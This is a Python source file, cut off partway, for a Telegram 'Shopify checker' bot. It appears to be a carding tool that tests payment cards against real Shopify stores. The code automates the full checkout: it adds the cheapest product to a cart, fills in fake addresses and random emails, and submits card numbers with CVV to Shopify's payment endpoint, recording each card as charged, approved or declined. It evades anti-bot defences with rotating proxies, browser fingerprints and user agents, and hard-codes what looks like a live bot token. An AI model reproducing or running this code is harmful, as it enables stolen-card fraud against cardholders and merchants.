#!/usr/bin/env python3
"""
SHOPIFY CHECKER BOT v6.0 - ULTIMATE EDITION
All commands: /sh, /msh, /mtxt, /addsite, /addproxy, /chksite, /chkproxy, /sites, /proxies, /delsite, /delproxy
(C) 2026 CAT Industries. All rights reserved.
"""

import os
import sys
import json
import random
import re
import time
import html
import urllib.parse
import subprocess
import shlex
import asyncio
import logging
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from collections import deque
import concurrent.futures

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# curl_cffi for TLS impersonation
from curl_cffi import requests
from curl_cffi.requests import Session

# ──────────────────────── CONFIG ─────────────────────────────────────
BOT_TOKEN = "8955638202:AAH_kuainJLiiVQi9pg3sUEjhL6HwO2ZiKw"
ADMIN_IDS = [8769972816]
PROXY_PATH = "px.txt"
CARDS_PATH = "test.txt"
SITES_PATH = "sites.txt"
RESULTS_PATH = "results.txt"
WORKING_SITES_API = "https://apok-production.up.railway.app/sites/working"
MAX_SITE_AMOUNT = 15.0
MAX_CONCURRENT = 20

# ──────────────────────── FULL ADDRESS DATABASE ──────────────────────
@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

COUNTRY_ADDRESSES = {
    "US": Address("james", "anderson", "428 st", "apt 4B", "New York", "US", "NY", "10080", "+12125550100"),
    "US-CA": Address("michael", "johnson", "123 Hollywood Blvd", "Suite 100", "Los Angeles", "US", "CA", "90028", "+13235550100"),
    "US-TX": Address("robert", "williams", "456 Main St", "", "Houston", "US", "TX", "77002", "+17135550100"),
    "US-FL": Address("david", "brown", "789 Ocean Dr", "Apt 12", "Miami", "US", "FL", "33139", "+13055550100"),
    "CA": Address("john", "smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A 0G9", "+16135550100"),
    "CA-BC": Address("william", "davis", "789 Granville St", "Floor 5", "Vancouver", "CA", "BC", "V6Z 1K9", "+16045550100"),
    "GB": Address("james", "wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+442012345678"),
    "GB-MAN": Address("oliver", "martinez", "123 Deansgate", "Apt 3B", "Manchester", "GB", "ENG", "M3 4BQ", "+441619876543"),
    "AU": Address("thomas", "taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678"),
    "AU-MEL": Address("daniel", "anderson", "100 Collins St", "Level 10", "Melbourne", "AU", "VIC", "3000", "+61398765432"),
    "DE": Address("lucas", "thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678"),
    "DE-MUC": Address("felix", "schmidt", "Marienplatz 1", "", "Munich", "DE", "BY", "80331", "+49891234567"),
    "FR": Address("hugo", "bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678"),
    "FR-LY": Address("louis", "petit", "15 Rue de la République", "", "Lyon", "FR", "ARA", "69001", "+33487654321"),
    "NZ": Address("jack", "wilson", "1 Queen St", "", "Auckland", "NZ", "AUK", "1010", "+6491234567"),
    "NZ-WLG": Address("liam", "brown", "100 Willis St", "Floor 2", "Wellington", "NZ", "WGN", "6011", "+6449876543"),
    "IE": Address("sean", "murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02 Y006", "+35311234567"),
    "IE-CORK": Address("patrick", "kelly", "100 Patrick St", "", "Cork", "IE", "CO", "T12 XY88", "+35321456789"),
    "NL": Address("bas", "jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012 JS", "+31201234567"),
    "ES": Address("carlos", "garcia", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34912345678"),
    "IT": Address("marco", "rossi", "Via Roma 1", "", "Rome", "IT", "RM", "00184", "+39061234567"),
    "SE": Address("erik", "andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123456"),
    "NO": Address("olav", "hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721234567"),
    "DK": Address("lars", "nielsen", "Strøget 1", "", "Copenhagen", "DK", "84", "1457", "+4531234567"),
    "FI": Address("jussi", "korhonen", "Mannerheimintie 1", "", "Helsinki", "FI", "18", "00100", "+35891234567"),
    "BE": Address("jan", "peeters", "Grote Markt 1", "", "Brussels", "BE", "BRU", "1000", "+3221234567"),
    "CH": Address("hans", "weber", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41441234567"),
    "AT": Address("markus", "gruber", "Stephansplatz 1", "", "Vienna", "AT", "9", "1010", "+4312345678"),
    "JP": Address("takashi", "yamamoto", "1-1-1 Marunouchi", "", "Tokyo", "JP", "13", "100-0005", "+81312345678"),
    "SG": Address("wei", "tan", "1 Raffles Place", "#01-01", "Singapore", "SG", "01", "048616", "+6561234567"),
    "AE": Address("ahmed", "al-mansouri", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "12345", "+97141234567"),
}

FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles",
               "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez",
              "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "white", "harris", "clark"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "icloud.com", "aol.com", "mail.com"]

# ──────────────────────── COMPLETE CHECKER ENGINE ────────────────────
class CheckStatus(Enum):
    CHARGED = 0
    APPROVED = 1
    DECLINED = 2
    ERROR = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    error: Exception = None
    retryable: bool = False

class ShopifyChecker:
    """Complete Shopify checkout bot with full GQL flow"""
    
    def __init__(self, proxy_url: str = None):
        self.proxy_url = proxy_url
        self.browser_profiles = ["chrome124", "chrome120", "chrome116", "edge101", "safari15_5", "firefox133"]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        ]
        self.session = None
    
    def _get_session(self):
        impersonate = random.choice(self.browser_profiles)
        user_agent = random.choice(self.user_agents)
        session = Session(impersonate=impersonate, timeout=30)
        session.headers.update({
            'User-Agent': user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
        if self.proxy_url:
            session.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return session
    
    def address_for_country(self, country: str) -> Address:
        if country in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[country]
        base = country[:2] if len(country) > 2 else country
        return COUNTRY_ADDRESSES.get(base, COUNTRY_ADDRESSES["US"])
    
    def generate_email(self) -> str:
        name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
        domain = random.choice(EMAIL_DOMAINS)
        return f"{name}@{domain}"
    
    def generate_attempt_token(self, checkout_token: str) -> str:
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"
    
    def generate_page_id(self) -> str:
        return f"{random.getrandbits(64):016x}"
    
    def to_float(self, v: Any) -> Tuple[float, bool]:
        if isinstance(v, (int, float)):
            return float(v), True
        if isinstance(v, str):
            match = re.search(r'[-+]?\d*\.?\d+', v)
            if match:
                try:
                    return float(match.group()), True
                except ValueError:
                    pass
        return 0, False
    
    def extract_queue_token(self, body: str) -> str:
        match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', body)
        return match.group(1) if match else ""
    
    def extract_stable_id(self, html_content: str) -> str:
        unescaped = html.unescape(html_content)
        match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
        return match.group(1) if match else ""
    
    def extract_commit_sha(self, html_content: str) -> str:
        unescaped = html.unescape(html_content)
        match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
        return match.group(1) if match else ""
    
    def extract_source_token(self, html_content: str) -> str:
        match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', html_content)
        if match:
            return html.unescape(match.group(1)).strip('"')
        return ""
    
    def extract_identification_signature(self, html_content: str) -> str:
        unescaped = html.unescape(html_content)
        match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
        return match.group(1) if match else ""
    
    def extract_private_access_token_id(self, html_content: str) -> str:
        unescaped = html.unescape(html_content)
        match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
        return match.group(1) if match else ""
    
    def extract_proposal_id(self, js_body: str) -> str:
        match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
        return match.group(1) if match else ""
    
    def extract_submit_id(self, js_body: str) -> str:
        match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
        return match.group(1) if match else ""
    
    def extract_receipt_id(self, body: str) -> str:
        match = re.search(r'"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9]+)"', body)
        return match.group(1) if match else ""
    
    def extract_receipt_session_token(self, body: str) -> str:
        match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body)
        return match.group(1) if match else ""
    
    def extract_pci_session_id(self, body: str) -> str:
        match = re.search(r'"id"\s*:\s*"([^"]+)"', body)
        return match.group(1) if match else ""
    
    def extract_delivery_handle(self, body: str) -> str:
        match = re.search(r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"', body)
        return match.group(1) if match else ""
    
    def extract_signed_handles(self, body: str) -> List[str]:
        return re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', body)
    
    def extract_seller_currency(self, body: str) -> str:
        match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', body)
        return match.group(1) if match else "USD"
    
    def extract_seller_country(self, body: str) -> str:
        match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', body)
        return match.group(1) if match else "US"
    
    def extract_checkout_total(self, body: str) -> str:
        match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', body)
        return match.group(1) if match else ""
    
    def extract_shipping_amount(self, body: str) -> str:
        match = re.search(r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', body)
        return match.group(1) if match else "0.00"
    
    def extract_any_error(self, body: str) -> str:
        match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', body)
        if match:
            return match.group(1)
        match = re.search(r'"localizedMessage"\s*:\s*"([^"]+)"', body)
        if match:
            return match.group(1)
        match = re.search(r'"code"\s*:\s*"([^"]+)"', body)
        if match:
            return match.group(1)
        return ""
    
    def patch_payload(self, payload: str, currency: str, country: str) -> str:
        if currency != "USD":
            payload = payload.replace('"currencyCode": "USD"', f'"currencyCode": "{currency}"')
            payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
        if country != "US":
            payload = payload.replace('"countryCode": "US"', f'"countryCode": "{country}"')
            payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
        return payload
    
    def find_cheapest_product(self, shop_url: str) -> Tuple[str, str, str, str]:
        session = self._get_session()
        try:
            resp = session.get(f"{shop_url}/products.json?limit=250", timeout=30)
            if resp.status_code != 200:
                return "", "", "", ""
            data = resp.json()
            products = data.get("products", [])
            best_price = float('inf')
            variant_id = ""
            product_title = ""
            product_id = ""
            price_str = ""
            for p in products:
                for v in p.get("variants", []):
                    if not v.get("available", False):
                        continue
                    try:
                        price = float(v.get("price", 0))
                    except:
                        continue
                    if price < best_price and price > 0:
                        best_price = price
                        variant_id = str(v.get("id", ""))
                        product_title = p.get("title", "")
                        product_id = str(p.get("id", ""))
                        price_str = v.get("price", "0.00")
            return product_title, product_id, variant_id, price_str
        except Exception as e:
            return "", "", "", ""
        finally:
            session.close()
    
    def add_to_cart_and_checkout(self, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
        session = self._get_session()
        try:
            payload = json.dumps({"id": int(variant_id), "quantity": 1})
            add_resp = session.post(f"{shop_url}/cart/add.js", data=payload, 
                                    headers={"Content-Type": "application/json"})
            if add_resp.status_code != 200:
                return "", "", "", ""
            
            checkout_resp = session.get(f"{shop_url}/checkout", allow_redirects=True)
            checkout_url = checkout_resp.url
            checkout_html = checkout_resp.text
            
            token_re = re.compile(r'/checkouts/cn/([^/?]+)')
            checkout_token = ""
            match = token_re.search(checkout_url)
            if match:
                checkout_token = match.group(1)
            
            session_re = re.compile(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"')
            session_token = ""
            match = session_re.search(checkout_html)
            if match:
                session_token = html.unescape(match.group(1)).strip('"')
            
            return checkout_url, checkout_token, session_token, checkout_html
        except Exception:
            return "", "", "", ""
        finally:
            session.close()
    
    def send_proposal(self, shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, stable_id: str, variant_id: str, price: str,
                      proposal_id: str, build_id: str, source_token: str, 
                      currency: str, country: str) -> Tuple[int, str]:
        
        session = self._get_session()
        try:
            gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{
      "sessionToken": "{session_token}"
    }},
    "queueToken": null,
    "discounts": {{
      "lines": [],
      "acceptUnexpectedDiscounts": true
    }},
    "delivery": {{
      "deliveryLines": [
        {{
          "destination": {{
            "partialStreetAddress": {{
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{
      "deliveryExpectationLines": []
    }},
    "merchandise": {{
      "merchandiseLines": [
        {{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }}
          }},
          "quantity": {{
            "items": {{"value": 1}}
          }},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null,
          "lineComponents": []
        }}
      ]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{
        "presentmentCurrency": "USD",
        "countryCode": "US"
      }},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{
      "message": null,
      "customAttributes": []
    }},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
            
            gql_payload = self.patch_payload(gql_payload, currency, country)
            
            headers = {
                "accept": "application/json",
                "accept-language": "en-US",
                "content-type": "application/json",
                "origin": shop_url,
                "referer": checkout_url,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
                "x-checkout-one-session-token": session_token,
                "x-checkout-web-build-id": build_id,
                "x-checkout-web-deploy-stage": "production",
                "x-checkout-web-server-handling": "fast",
                "x-checkout-web-server-rendering": "yes",
                "x-checkout-web-source-id": source_token
            }
            
            resp = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
                                data=gql_payload, headers=headers)
            return resp.status_code, resp.text
        except Exception as e:
            return 500, str(e)
        finally:
            session.close()
    
    def send_proposal2(self, shop_url: str, checkout_url: str, checkout_token: str,
                       session_token: str, stable_id: str, variant_id: str, price: str,
                       proposal_id: str, build_id: str, source_token: str, queue_token: str,
                       email: str, currency: str, country: str) -> Tuple[int, str]:
        
        session = self._get_session()
        try:
            gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{
      "sessionToken": "{session_token}"
    }},
    "queueToken": "{queue_token}",
    "discounts": {{
      "lines": [],
      "acceptUnexpectedDiscounts": true
    }},
    "delivery": {{
      "deliveryLines": [
        {{
          "destination": {{
            "partialStreetAddress": {{
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{
      "deliveryExpectationLines": []
    }},
    "merchandise": {{
      "merchandiseLines": [
        {{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }}
          }},
          "quantity": {{
            "items": {{"value": 1}}
          }},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null,
          "lineComponents": []
        }}
      ]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{
        "presentmentCurrency": "USD",
        "countryCode": "US"
      }},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{
      "message": null,
      "customAttributes": []
    }},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
            
            gql_payload = self.patch_payload(gql_payload, currency, country)
            
            headers = {
                "accept": "application/json",
                "accept-language": "en-US",
                "content-type": "application/json",
                "origin": shop_url,
                "referer": checkout_url,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
                "x-checkout-one-session-token": session_token,
                "x-checkout-web-build-id": build_id,
                "x-checkout-web-deploy-stage": "production",
                "x-checkout-web-server-handling": "fast",
                "x-checkout-web-server-rendering": "yes",
                "x-checkout-web-source-id": source_token
            }
            
            resp = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
                                data=gql_payload, headers=headers)
            return resp.status_code, resp.text
        except Exception as e:
            return 500, str(e)
        finally:
            session.close()
    
    def send_proposal3(self, shop_url: str, checkout_url: str, checkout_token: str,
                       session_token: str, stable_id: str, variant_id: str, price: str,
                       proposal_id: str, build_id: str, source_token: str, queue_token: str,
                       email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:
        
        session = self._get_session()
        try:
            gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{
      "sessionToken": "{session_token}"
    }},
    "queueToken": "{queue_token}",
    "discounts": {{
      "lines": [],
      "acceptUnexpectedDiscounts": true
    }},
    "delivery": {{
      "deliveryLines": [
        {{
          "destination": {{
            "partialStreetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{
      "deliveryExpectationLines": []
    }},
    "merchandise": {{
      "merchandiseLines": [
        {{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }}
          }},
          "quantity": {{
            "items": {{"value": 1}}
          }},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null,
          "lineComponents": []
        }}
      ]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{
        "presentmentCurrency": "USD",
        "countryCode": "US"
      }},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{
      "message": null,
      "customAttributes": []
    }},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
            
            gql_payload = self.patch_payload(gql_payload, currency, country)
            
            headers = {
                "accept": "application/json",
                "accept-language": "en-US",
                "content-type": "application/json",
                "origin": shop_url,
                "referer": checkout_url,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
                "x-checkout-one-session-token": session_token,
                "x-checkout-web-build-id": build_id,
                "x-checkout-web-deploy-stage": "production",
                "x-checkout-web-server-handling": "fast",
                "x-checkout-web-server-rendering": "yes",
                "x-checkout-web-source-id": source_token
            }
            
            resp = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
                                data=gql_payload, headers=headers)
            return resp.status_code, resp.text
        except Exception as e:
            return 500, str(e)
        finally:
            session.close()
    
    def send_pci_session(self, ident_sig: str, card_number: str, card_name: str,
                         card_month: int, card_year: int, cvv: str,
                         shop_domain: str) -> Tuple[int, str]:
        
        payload = json.dumps({
            "credit_card": {
                "number": card_number,
                "month": card_month,
                "year": card_year,
                "verification_value": cvv,
                "start_month": None,
                "start_year": None,
                "issue_number": "",
                "name": card_name
            },
            "payment_session_scope": shop_domain
        })
        
        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://checkout.pci.shopifyinc.com",
            "referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html",
            "shopify-identification-signature": ident_sig,
        }
        
        session = requests.Session()
        if self.proxy_url:
            session.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        
        try:
            resp = session.post("https://checkout.pci.shopifyinc.com/sessions", 
                               data=payload, headers=headers, timeout=30)
            return resp.status_code, resp.text
        except Exception as e:
            return 500, str(e)
        finally:
            session.close()
    
    def send_submit_for_completion(self, shop_url: str, checkout_url: str, checkout_token: str,
                                   session_token: str, stable_id: str, variant_id: str, price: str,
                                   submit_id: str, build_id: str, source_token: str, queue_token: str,
                                   email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                                   total_amount: str, pci_session_id: str, attempt_token: str,
                                   currency: str, country: str, signed_handles: List[str]) -> Tuple[int, str]:
        
        session = self._get_session()
        try:
            handle_lines = [json.dumps({"signedHandle": h}) for h in signed_handles]
            signed_handles_json = "[" + ",".join(handle_lines) + "]"
            page_id = self.generate_page_id()
            
            gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{
        "sessionToken": "{session_token}"
      }},
      "queueToken": "{queue_token}",
      "discounts": {{
        "lines": [],
        "acceptUnexpectedDiscounts": true
      }},
      "delivery": {{
        "deliveryLines": [
          {{
            "destination": {{
              "streetAddress": {{
                "address1": "{addr.address1}",
                "address2": "{addr.address2}",
                "city": "{addr.city}",
                "countryCode": "{addr.country_code}",
                "postalCode": "{addr.postal_code}",
                "firstName": "{addr.first_name}",
                "lastName": "{addr.last_name}",
                "zoneCode": "{addr.zone_code}",
                "phone": "{addr.phone}",
                "oneTimeUse": false
              }}
            }},
            "selectedDeliveryStrategy": {{
              "deliveryStrategyByHandle": {{
                "handle": "{delivery_handle}",
                "customDeliveryRate": false
              }},
              "options": {{}}
            }},
            "targetMerchandiseLines": {{
              "lines": [
                {{"stableId": "{stable_id}"}}
              ]
            }},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {{"any": true}},
            "destinationChanged": false
          }}
        ],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{
        "deliveryExpectationLines": {signed_handles_json}
      }},
      "merchandise": {{
        "merchandiseLines": [
          {{
            "stableId": "{stable_id}",
            "merchandise": {{
              "productVariantReference": {{
                "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
                "variantId": "gid://shopify/ProductVariant/{variant_id}",
                "properties": [],
                "sellingPlanId": null,
                "sellingPlanDigest": null
              }}
            }},
            "quantity": {{
              "items": {{"value": 1}}
            }},
            "expectedTotalPrice": {{"any": true}},
            "lineComponentsSource": null,
            "lineComponents": []
          }}
        ]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        "totalAmount": {{
          "value": {{
            "amount": "{total_amount}",
            "currencyCode": "USD"
          }}
        }},
        "paymentLines": [
          {{
            "paymentMethod": {{
              "directPaymentMethod": {{
                "sessionId": "{pci_session_id}",
                "billingAddress": {{
                  "streetAddress": {{
                    "address1": "{addr.address1}",
                    "address2": "{addr.address2}",
                    "city": "{addr.city}",
                    "countryCode": "{addr.country_code}",
